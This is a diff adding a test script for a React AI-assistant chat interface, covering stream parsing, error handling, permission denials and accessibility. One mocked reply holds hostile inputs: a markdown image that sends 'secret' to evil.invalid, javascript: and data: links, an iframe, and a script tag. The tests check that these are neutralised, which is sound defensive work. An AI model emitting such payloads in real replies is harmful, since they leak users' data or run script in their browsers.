@@ -1,0 +1,204 @@
+import assert from 'node:assert/strict';
+import fs from 'node:fs/promises';
+import {build} from 'esbuild';
+import {JSDOM} from 'jsdom';
+import React,{act} from 'react';
+import {createRoot} from 'react-dom/client';
+const result=await build({stdin:{contents:"export {readEvents} from './src/assistant/stream';export {createChatAdapter,ERROR_TEXT} from './src/assistant/runtime';export {rememberedModel} from './src/assistant/ModelSelector';export {AssistantChat} from './src/assistant/AssistantChat';export {invalidateSessionEpoch} from './src/api';export {parseRoute,normalizeRoute} from './src/api';export {routeLoaders,prefetchRoute} from './src/routeLoader';export {default as Assistant} from './src/Assistant';",resolveDir:import.meta.dirname},bundle:true,write:false,platform:'node',format:'esm',jsx:'automatic',packages:'external',loader:{'.css':'empty'}});
+const path=new URL('./.assistant-test.mjs',import.meta.url);await fs.writeFile(path,result.outputFiles[0].text);
+let ui;try{ui=await import(path.href)}finally{await fs.unlink(path)}
+const encoder=new TextEncoder();
+const stream=(text,width=1)=>new ReadableStream({start(controller){const bytes=encoder.encode(text);for(let i=0;i<bytes.length;i+=width)controller.enqueue(bytes.slice(i,i+width));controller.close()}});
+const event=data=>'data: '+JSON.stringify(data)+'\r\n\r\n';
+const collect=async iterable=>{const values=[];for await(const value of iterable)values.push(value);return values};
+for(const scope of ['global','project'])assert.deepEqual(await collect(ui.readEvents(stream(event({type:'start',scope})),new AbortController().signal)),[{type:'start',scope}]);
+await assert.rejects(()=>collect(ui.readEvents(stream(event({type:'start',scope:'invalid'})),new AbortController().signal)));
+const detailEvent={type:'error',code:'ai_upstream',detail:'OpenAI 401 invalid_api_key'};assert.deepEqual(await collect(ui.readEvents(stream(event(detailEvent)),new AbortController().signal)),[detailEvent]);await assert.rejects(()=>collect(ui.readEvents(stream(event({...detailEvent,detail:123})),new AbortController().signal)));
+const events=[{type:'text',delta:'今天王小明遲到。'},{type:'done'}];
+for(const width of [1,2,7,1024])assert.deepEqual(await collect(ui.readEvents(stream(': keepalive\r\n\r\n'+events.map(event).join('').trimEnd(),width),new AbortController().signal)),events);
+assert.deepEqual(await collect(ui.readEvents(stream('event: text\ndata: {"type":"text",\ndata: "delta":"跨行"}\n\n'),new AbortController().signal)),[{type:'text',delta:'跨行'}]);
+await assert.rejects(()=>collect(ui.readEvents(stream('data: {broken'),new AbortController().signal)),SyntaxError);
+const abort=new AbortController();let cancelled=false;
+const waiting=new ReadableStream({cancel(){cancelled=true}});
+const reading=collect(ui.readEvents(waiting,abort.signal));abort.abort();await assert.rejects(()=>reading,{name:'AbortError'});assert.equal(cancelled,true);
+const dom=new JSDOM('<div id="root"></div>',{url:'http://localhost/#view=assistant',pretendToBeVisual:true});
+for(const key of ['window','document','location','history','sessionStorage','localStorage','FormData','Event','HTMLElement','navigator','MutationObserver','Element','Node'])Object.defineProperty(globalThis,key,{value:dom.window[key],configurable:true});
+window.matchMedia=()=>({matches:false,addEventListener(){},removeEventListener(){}});
+globalThis.ResizeObserver=class{observe(){}unobserve(){}disconnect(){}};
+window.HTMLElement.prototype.attachEvent=()=>{};window.HTMLElement.prototype.detachEvent=()=>{};
+window.HTMLElement.prototype.scrollIntoView=()=>{};window.HTMLElement.prototype.scrollTo=()=>{};
+globalThis.requestAnimationFrame=fn=>setTimeout(fn,0);globalThis.cancelAnimationFrame=clearTimeout;globalThis.IS_REACT_ACT_ENVIRONMENT=true;
+const json=(data,status=200)=>new Response(JSON.stringify(data),{status,headers:{'content-type':'application/json'}});
+const messages=[{role:'user',content:[{type:'text',text:'今天誰遲到？'}]}];
+const run=async(history=messages,onForbidden=()=>{})=>collect(ui.createChatAdapter(()=>'c-test',onForbidden).run({messages:history,abortSignal:new AbortController().signal,context:{config:{modelName:'gpt'}}}));
+let request;
+globalThis.fetch=async(url,init)=>{request={url,...init};return new Response(stream(event({type:'start',conversation_id:'c-test',provider:'gpt'})+event({type:'tool',id:'t1',name:'attendance_today',label:'查詢今天出勤',status:'running'})+event({type:'text',delta:'王'})+event({type:'text',delta:'小明'})+event({type:'tool',id:'t1',name:'attendance_today',label:'查詢今天出勤',status:'done'})+event({type:'done'})))};
+const updates=await run();assert.equal(updates[2].content.at(-1).text,'王');assert.equal(updates.at(-1).content.at(-1).text,'王小明');assert.equal(updates.at(-1).content[0].result,'done');assert.equal(updates.at(-1).status.type,'complete');
+assert.equal(request.credentials,'same-origin');assert.deepEqual(JSON.parse(request.body),{model:'gpt',conversation_id:'c-test',messages:[{role:'user',content:'今天誰遲到？'}]});
+const turn=(role,text,status)=>({role,content:[{type:'text',text}],...(status?{status}:{})});
+const sent=()=>JSON.parse(request.body).messages;
+await run([turn('user','question'),turn('assistant','a'.repeat(21000)),turn('user','next')]);
+assert.equal(sent()[1].content.length,20000,'assistant history clips to 20000 characters');
+await run([turn('user','question'),...['error','cancelled'].map(reason=>turn('assistant','discard',{type:'incomplete',reason})),turn('assistant',''),turn('user','next')]);
+assert.deepEqual(sent().map(m=>m.content),['question','next'],'failed, aborted and empty assistant turns are omitted');
+const longHistory=Array.from({length:25},(_,i)=>turn(i%2?'assistant':'user',String(i)));
+await run(longHistory);assert.equal(sent().length,19,'window drops its leading assistant');assert.equal(sent()[0].content,'6');assert.equal(sent().at(-1).role,'user');
+await run([...longHistory,turn('assistant','stale')]);assert.equal(sent().at(-1).content,'24','history ends with the latest user');
+let validationFetches=0;const successFetch=globalThis.fetch;
+globalThis.fetch=async(...args)=>{validationFetches++;return successFetch(...args)};
+assert.equal((await run([turn('user','x'.repeat(4001))])).at(-1).status.error,ui.ERROR_TEXT.message_limit);assert.equal(validationFetches,0,'long user validation happens before fetch');
+await run([turn('user','x'.repeat(4001)),turn('assistant','discard',{type:'incomplete',reason:'error'}),turn('user','short retry')]);
+assert.deepEqual(sent().map(m=>m.content),['short retry'],'a rejected oversized question does not poison later sends');
+for(const body of [{code:'ai_forbidden'}]){
+ let forbidden=0;globalThis.fetch=async()=>json(body,403);
+ assert.equal((await run(messages,()=>forbidden++)).at(-1).status.error,ui.ERROR_TEXT.ai_forbidden);assert.equal(forbidden,1,'403 reports forbidden without retry');
+}
+for(const code of ['ai_unconfigured','ai_quota','ai_busy','ai_upstream','ai_forbidden','ai_refused']){
+ for(const http of [false,true]){globalThis.fetch=async()=>http?json({code,message:'private upstream details'},503):new Response(stream(event({type:'error',code,message:'private upstream details'})));const result=await run();assert.deepEqual(result.at(-1).status,{type:'incomplete',reason:'error',error:ui.ERROR_TEXT[code]})}
+}
+for(const [status,code] of [[503,'ai_upstream'],[503,'ai_forbidden']]){let forbidden=0;globalThis.fetch=async()=>json({code},status);await run(messages,()=>forbidden++);assert.equal(forbidden,0,'non-denial statuses do not latch')}
+globalThis.fetch=async()=>{throw new TypeError('Failed to fetch')};assert.equal((await run()).at(-1).status.error,ui.ERROR_TEXT.network);
+globalThis.fetch=async()=>new Response(stream(event({type:'text',delta:'partial'})));assert.equal((await run()).at(-1).status.error,ui.ERROR_TEXT.network);
+const runAbort=new AbortController();let fetchSignal;globalThis.fetch=async(_url,init)=>{fetchSignal=init.signal;return new Response(new ReadableStream())};const abortedRun=collect(ui.createChatAdapter(()=>'abort').run({messages,abortSignal:runAbort.signal,context:{}}));await new Promise(resolve=>setTimeout(resolve,0));runAbort.abort();await assert.rejects(()=>abortedRun,{name:'AbortError'});assert.equal(fetchSignal.aborted,true);
+let expired=0;window.addEventListener('yx:session-expired',()=>expired++);globalThis.fetch=async()=>json({},401);await run();assert.equal(expired,1);
+let lateHeaders;
+globalThis.fetch=()=>new Promise(resolve=>{lateHeaders=resolve});
+const oldRun=run();ui.invalidateSessionEpoch();
+lateHeaders(new Response(stream(event({type:'text',delta:'old secret'})+event({type:'done'}))));
+await assert.rejects(oldRun,{name:'AbortError'});
+let lateBody;
+let epochFetchSignal;globalThis.fetch=async(_url,init)=>{epochFetchSignal=init.signal;return new Response(new ReadableStream({start(c){lateBody=c}}))};
+const oldBody=run();await new Promise(resolve=>setTimeout(resolve,0));ui.invalidateSessionEpoch();
+assert.equal(epochFetchSignal.aborted,true,'epoch immediately aborts the transport during a silent tool round');
+await assert.rejects(oldBody,{name:'AbortError'});
+let midStreamExpired=0;const expire=()=>midStreamExpired++;window.addEventListener('yx:session-expired',expire);
+globalThis.fetch=async()=>new Response(stream(event({type:'text',delta:'private partial'})+event({type:'error',code:'session_expired'})));
+const sessionUpdates=await run();assert.equal(midStreamExpired,1);assert.deepEqual(sessionUpdates.at(-1).content,[]);window.removeEventListener('yx:session-expired',expire);
+let deniedStream=0;
+globalThis.fetch=async()=>new Response(stream(event({type:'text',delta:'partial secret'})+event({type:'error',code:'ai_forbidden'})));
+const deniedUpdates=await run(messages,()=>deniedStream++);
+assert.equal(deniedStream,1);assert.deepEqual(deniedUpdates.at(-1).content,[],'SSE denial removes transient content');
+const catalog={default:'claude',models:[{id:'claude',label:'Claude',available:true},{id:'gpt',label:'GPT',available:false}]};
+localStorage.setItem('yx:ai-model','gpt');assert.equal(ui.rememberedModel(catalog),'claude');
+localStorage.setItem('yx:ai-model','garbage');assert.equal(ui.rememberedModel(catalog),'claude');
+const root=createRoot(document.getElementById('root'));
+const flush=async(fn=()=>{},delay=10)=>act(async()=>{await fn();await new Promise(resolve=>setTimeout(resolve,delay))});
+assert.equal(ui.parseRoute('#view=assistant').view,'assistant');assert.equal(ui.normalizeRoute({view:'assistant'}).view,'assistant');let prefetched=false;const load=ui.routeLoaders.Assistant;ui.routeLoaders.Assistant=()=>{prefetched=true;return load()};await ui.prefetchRoute({view:'assistant'});assert.equal(prefetched,true);assert.equal(typeof (await ui.routeLoaders.Assistant()).default,'function');
+globalThis.fetch=async url=>url==='/api/ai/models'?json(catalog):new Response(stream(event({type:'text',delta:'今天尚無遲到紀錄。\n\n![private alt](https://evil.invalid/?d=secret) [unsafe](javascript:alert%281%29) [safe](https://example.com) [data](data:text/html,secret)\n\n<iframe src="https://evil.invalid"></iframe>\n\n| 同事 | 紀錄 |\n| --- | --- |\n| 王小明 | 到班 |'})+event({type:'done'})));
+await flush(()=>root.render(React.createElement(ui.Assistant)),40);
+assert.equal(document.querySelectorAll('.assistant-suggestions button').length,4);assert.equal([...document.querySelectorAll('button')].find(b=>b.textContent==='送出').disabled,true);
+await flush(()=>document.querySelectorAll('.assistant-suggestions button')[2].click());assert.equal(document.querySelector('textarea').value,'請查詢案件進度：');
+await flush(()=>document.querySelectorAll('.assistant-suggestions button')[0].click(),80);assert.match(document.body.textContent,/今天尚無遲到紀錄/);assert.equal(document.querySelectorAll('.assistant-table table tbody tr').length,1);
+assert.equal(document.querySelector('[role=log]').getAttribute('aria-live'),'off');assert.equal(document.querySelector('[role=log]').contains(document.querySelector('.assistant-completion')),false,'the completion status sits outside the log so it is not announced twice');assert.equal(document.querySelector('[role=log]').contains(document.querySelector('[data-slot=scroll-anchor]')),false);assert.match(document.querySelector('.assistant-completion').textContent,/回答完成/);
+const viewport=document.querySelector('[role=log]'),scrollButton=document.querySelector('[data-slot=scroll-anchor]');
+Object.defineProperties(viewport,{scrollHeight:{value:1000,configurable:true},clientHeight:{value:400,configurable:true}});
+for(const [distance,hidden] of [[0,true],[12,true],[80,true],[81,false],[300,false],[0,true]]){
+ viewport.scrollTop=600-distance;
+ await flush(()=>viewport.dispatchEvent(new window.Event('scroll')));
+ assert.equal(scrollButton.hidden,hidden,`scroll control at ${distance}px from bottom`);
+}
+let scrollTarget;viewport.scrollTo=target=>{scrollTarget=target};
+viewport.scrollTop=0;await flush(()=>viewport.dispatchEvent(new window.Event('scroll')));
+await flush(()=>scrollButton.click());assert.deepEqual(scrollTarget,{top:1000,behavior:'smooth'});
+assert.equal(document.activeElement,viewport,'focus moves to the thread before the button hides');
+const assistantCss=await fs.readFile(new URL('./src/Assistant.css',import.meta.url),'utf8');assert.match(assistantCss,/\.assistant-viewport:focus-visible\{outline:2px solid/,'the thread keeps a visible focus ring for keyboard users');assert.doesNotMatch(assistantCss,/\.assistant-viewport:focus\{outline:none\}/,'focus is never hidden unconditionally');
+const controlsCss=await fs.readFile(new URL('./src/design/controls.css',import.meta.url),'utf8');
+assert.doesNotMatch(assistantCss,/\.assistant-composer:focus-within\{border-color/,'composer does not gain a heavy focus border');
+assert.match(controlsCss,/\.assistant-composer textarea:is\(:enabled,:disabled,:hover,:focus,:focus-visible\)\{border:0;outline:none;box-shadow:none/,'controls layer keeps the textarea frameless');
+for(const css of [assistantCss,controlsCss]){
+ for(const rule of css.matchAll(/([^{}]+)\{([^{}]*)\}/g)){
+  for(const selector of [rule[1]]){
+   if(/\.assistant-composer(?=[:\s.#>+~]|$)/.test(selector)&&/:focus/.test(selector)&&!/\.assistant-composer\s+textarea/.test(selector)){
+    assert.doesNotMatch(rule[2],/border(?:-[a-z-]+)?\s*:/,'composer focus rules must not change border');
+    if(!selector.includes('.assistant-chat[data-input=keyboard]'))assert.doesNotMatch(rule[2],/box-shadow\s*:/,'pointer focus must preserve composer shadow');
+   }
+  }
+ }
+}
+window.matchMedia=()=>({matches:true});viewport.scrollTop=0;await flush(()=>viewport.dispatchEvent(new window.Event('scroll')));await flush(()=>scrollButton.click());assert.equal(scrollTarget.behavior,'auto','reduced motion scrolls without animation');delete window.matchMedia;
+assert.equal(document.querySelectorAll('.assistant-message img').length,0,'markdown images render no image element');
+assert.match(document.body.textContent,/private alt/);
+assert.equal(document.querySelector('.assistant-message iframe'),null,'raw HTML stays escaped');
+assert.match(document.body.textContent,/<iframe/);
+const links=[...document.querySelectorAll('.assistant-message a')];assert.equal(links.length,1,'unsafe schemes render plain text');assert.equal(links[0].target,'_blank');assert.equal(links[0].rel,'noopener noreferrer nofollow');
+await flush(()=>[...document.querySelectorAll('button')].find(b=>b.textContent==='新對話').click());assert.equal(document.querySelectorAll('.assistant-suggestions button').length,4);
+globalThis.fetch=async()=>json({code:'ai_upstream'},503);
+await flush(()=>document.querySelectorAll('.assistant-suggestions button')[0].click(),60);assert.match(document.body.textContent,/AI 服務暫時無法回應/);assert.equal(document.querySelector('textarea').disabled,false);assert.match(document.querySelector('.assistant-completion').textContent,/回答失敗：.*AI 服務暫時無法回應/,'a failed answer is announced through the status region');
+globalThis.fetch=async()=>new Response(stream(event({type:'text',delta:'重試成功'})+event({type:'done'})));await flush(()=>[...document.querySelectorAll('button')].find(b=>b.textContent==='重試').click(),60);assert.match(document.body.textContent,/重試成功/);assert.equal(document.querySelector('textarea').disabled,false);
+globalThis.fetch=async()=>json({code:'ai_forbidden'},403);
+await flush(()=>[...document.querySelectorAll('button')].find(b=>b.textContent==='重試').click(),60);
+assert.match(document.body.textContent,/你沒有權限查詢這項資料/);assert.equal(document.querySelector('textarea'),null,'chat denial discards composer and draft');assert.equal(document.querySelectorAll('.assistant-message').length,0,'chat denial discards transcript');
+assert.equal([...document.querySelectorAll('button')].some(b=>b.textContent==='重試'),false,'forbidden chat cannot retry');
+for(const asStream of [false,true]){
+ globalThis.fetch=async url=>url==='/api/ai/models'?json(catalog):url.startsWith('/api/ai/conversations')?json({history_available:true,items:[],next_cursor:null}):asStream?new Response(stream(event({type:'error',code:'ai_forbidden',denial_scope:'conversation'}))):json({code:'ai_forbidden',denial_scope:'conversation'},403);
+ await flush(()=>root.render(React.createElement(ui.Assistant,{key:`denied-conversation-${asStream}`})),40);
+ await flush(()=>document.querySelector('.assistant-suggestions button').click(),60);
+ assert.ok(document.querySelector('textarea'),'a denied conversation leaves global assistant available');
+ assert.equal(document.querySelectorAll('.assistant-message').length,0);assert.match(document.body.textContent,/沒有權限/);
+}
+for(const detail of [undefined,'OpenAI 401 invalid_api_key <script>']){
+ globalThis.fetch=async url=>url==='/api/ai/models'?json(catalog):new Response(stream(event({type:'error',code:'ai_upstream',...(detail?{detail}:{})})));
+ await flush(()=>root.render(React.createElement(ui.Assistant,{key:detail||'no-detail'})),40);
+ await flush(()=>document.querySelector('.assistant-suggestions button').click(),60);
+ assert.match(document.querySelector('.assistant-error').textContent,/AI 服務暫時無法回應/);
+ assert.equal(document.querySelector('.assistant-error-detail')?.textContent,detail);
+ assert.equal(document.querySelector('.assistant-error script'),null);
+}
+const both={default:'claude',models:[{id:'claude',label:'Claude',available:true},{id:'gpt',label:'GPT',available:true}]};
+let chatRequests=[];
+globalThis.fetch=async(url,init)=>{
+ if(url==='/api/ai/models')return json(both);
+ chatRequests.push(JSON.parse(init.body));
+ return new Response(stream(event({type:'start',scope:'project',usage_id:'test'})+event({type:'text',delta:'案件正在規劃。'})+event({type:'done'})));
+};
+await flush(()=>root.render(React.createElement(ui.AssistantChat,{projectId:'project-a',compact:true})),40);
+assert.equal(document.querySelector('h1'),null,'compact mode omits page heading');
+assert.deepEqual([...document.querySelectorAll('.assistant-suggestions button')].map(b=>b.textContent),['進度如何？','卡在哪裡？','誰負責？','下一步是什麼？','最近有什麼變更？']);
+assert.equal(document.querySelector('textarea').placeholder,'輸入問題');
+await flush(()=>document.querySelector('[role=combobox]').click());
+await flush(()=>[...document.querySelectorAll('[role=option]')].find(b=>b.textContent==='GPT').click());
+assert.equal(localStorage.getItem('yx:ai-model'),'gpt');
+await flush(()=>document.querySelector('.assistant-suggestions button').click(),60);
+assert.equal(chatRequests[0].model,'gpt','selector model context reaches adapter and HTTP body');
+assert.equal(chatRequests[0].project_id,'project-a');
+assert.deepEqual(chatRequests[0].messages,[{role:'user',content:'進度如何？'}]);
+assert.equal(document.querySelector('.assistant-tool'),null);
+assert.doesNotMatch(document.body.textContent,/回答依你可查看|重要資訊請再核對|查詢今天出勤/);
+await flush(()=>root.render(React.createElement(ui.AssistantChat,{projectId:'project-b',compact:true})),40);
+assert.equal(document.querySelectorAll('.assistant-message').length,0,'project change clears history');
+await flush(()=>document.querySelectorAll('.assistant-suggestions button')[2].click(),60);
+assert.equal(chatRequests[1].project_id,'project-b');
+assert.notEqual(chatRequests[0].conversation_id,chatRequests[1].conversation_id);
+assert.deepEqual(chatRequests[1].messages,[{role:'user',content:'誰負責？'}]);
+await flush(()=>root.render(React.createElement(ui.Assistant,{key:'disabled-provider'})),40);
+globalThis.fetch=async url=>url==='/api/ai/models'?json(catalog):new Response(stream(event({type:'done'})));
+await flush(()=>root.render(React.createElement(ui.Assistant,{key:'disabled-provider-2'})),40);
+await flush(()=>document.querySelector('[role=combobox]').click());
+const unavailable=[...document.querySelectorAll('[role=option]')].find(b=>b.textContent.includes('GPT'));
+assert.equal(unavailable.disabled,true);assert.match(unavailable.textContent,/尚未設定/);
+let liveController,liveSignal;
+globalThis.fetch=async(url,init)=>{
+ if(url==='/api/ai/models')return json(both);
+ liveSignal=init.signal;
+ return new Response(new ReadableStream({start(controller){liveController=controller;controller.enqueue(encoder.encode(event({type:'tool',id:'hidden',name:'attendance_today',label:'不應顯示的工具標籤',status:'running'})))}}));
+};
+await flush(()=>root.render(React.createElement(ui.AssistantChat,{key:'live',projectId:'live-project',compact:true})),40);
+await flush(()=>document.querySelector('.assistant-suggestions button').click(),40);
+assert.equal(document.querySelectorAll('[data-slot=thinking-indicator]').length,1);assert.equal(document.querySelector('[role=log]').getAttribute('aria-busy'),'true');assert.equal(document.querySelector('.assistant-completion').textContent,'');
+assert.doesNotMatch(document.body.textContent,/不應顯示的工具標籤/);
+await flush(()=>liveController.enqueue(encoder.encode(event({type:'text',delta:'第一段回答'}))),40);
+assert.match(document.body.textContent,/第一段回答/);assert.equal(document.querySelector('.assistant-completion').textContent,'');assert.equal(document.querySelector('[data-role=assistant]').closest('[aria-live=off]')!==null,true);
+assert.equal(document.querySelector('[data-slot=thinking-indicator]'),null,'thinking disappears when answer starts');
+await flush(()=>[...document.querySelectorAll('button')].find(b=>b.textContent==='停止回應').click(),40);
+assert.equal(liveSignal.aborted,true,'stop cancels the underlying fetch');
+await flush(()=>root.unmount());
+for(const body of [{code:'ai_forbidden'}]){
+ const forbiddenRoot=createRoot(document.getElementById('root'));let calls=0;globalThis.fetch=async()=>{calls++;return json(body,403)};
+ await flush(()=>forbiddenRoot.render(React.createElement(ui.Assistant)),40);
+ assert.match(document.body.textContent,/你沒有權限查詢這項資料/);assert.equal(document.querySelector('textarea')?.disabled??true,true);assert.equal([...document.querySelectorAll('button')].some(b=>b.textContent==='重試'),false);assert.equal(calls,1);
+ await flush(()=>forbiddenRoot.unmount());
+}
+dom.window.close();
+console.log('Assistant passed: UTF-8/chunk boundaries, CRLF/multiline/trailing SSE, abort, tools, errors, session expiry, persistence, disabled models, suggestions and lazy route.');
+
+await import('./scripts/test-assistant-focus.mjs');
